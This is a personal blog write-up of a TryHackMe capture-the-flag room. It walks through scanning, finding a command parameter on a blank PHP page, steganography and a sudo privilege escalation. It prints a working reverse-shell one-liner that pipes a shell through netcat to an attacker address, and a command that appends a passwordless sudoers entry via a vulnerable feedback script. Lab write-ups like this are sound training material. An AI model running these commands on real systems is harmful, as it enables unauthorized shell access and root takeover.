
---
layout: ../../layouts/BlogLayout.astro
title: "U A High School THM Room Write-Up"
date: "JUL 5, 2026"
readTime: "5 MIN READ"
author: "Harsha"
category: "cyber"

---

Hi guys I'm here with another crazy write-up

Room name: U A High School  
Room difficulty: EASY

I should solve some non-easy rooms ey😅, anyway we got the IP with a description of mostly nothing.

Nmap gave me open ports 22 and 80

```
nmap -p- -sC -sV MACHINE_IP
```

The website itself is not giving off something even after searching through their source code pages nothing

Even Gobuster gave me so little this time

```
gobuster dir -u URL -w WORDLIST -t 64
```

It only gave me an assets directory and a server-status which both are seemed nothing, I then tried for any subdomains with ffuf but nothing came up.

Then I read the desc of the machine once again and decided to dig deeper and ran gobuster from the the assets page and got an index.php, weird but its blank completely. Anther break here.

I researched about blank index.php pages and got to know that it may be waiting for a query and tried fuzzing the parameters and values again nothing.

But why not try a cmd parameter may be its directly asking for a command, I know its weird but it is really asking for a command

`http://MACHINE_IP/assets/index.php?cmd=ls` boom!! its answering in base64.

`echo BASE_64_STRING | base64 -d`  resulted in some assets like images, index.php and some other but we can get a rev shell from the cmd prompt and got the reverse shell with a blink of an eye

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc YOUR_IP LISTENING_PORT >/tmp/f
```

remember to listen on the particular port on your terminal with `nc -lnvp LISTENING_PORT`  we got the shell.

but user.txt belongs to the user deku, of course from My Hero Academia. wandered around for the password for the user deku and there is a folder called Hidden_Content and from it I got a passphrase and thought I should crack some ssh this time and searched for that but no, the  folder .ssh is protected by user deku 

But there is a suspicious image in images directory, a jpg file and I downloaded it cause why not that's the only lead I got , and guess what its broken 

I used some online tools to fix it and searched with strings and steghide. As expected the steghide is asking for a password and I gave the password I got from the Hidden_Content folder.

Now we know the password for user deku.

I switched to the user deku and got the user.txt

Now for the root privileges we need something to escalate our privileges, I ran sudo -l to know what files can this user run with sudo privileges, it directed me to a .sh file

```
User deku may run the following commands on ip-10-48-184-107:
    (ALL) /opt/NewComponent/feedback.sh

```

After reading the code inside it I suspected some insecure processing of user feedback but I don't know how to exploit it.

I did some research and got to know that we can make our self as sudoers user but running this command 

```
user ALL=NOPASSWD: ALL >> /etc/sudoers
```

and I submitted my feedback with altering the user name as deku and guess what it worked....

I switched to the root user with `sudo su` and got the root.txt

It seems I got both flags in a spawn of 2hrs? NOPE I started the room yesterday night and got stuck and slept, I restarted my enumeration today morning and completed it at around lunch time🤣. Anyway this is a good room for learning. 

Thank you for reading see you soon.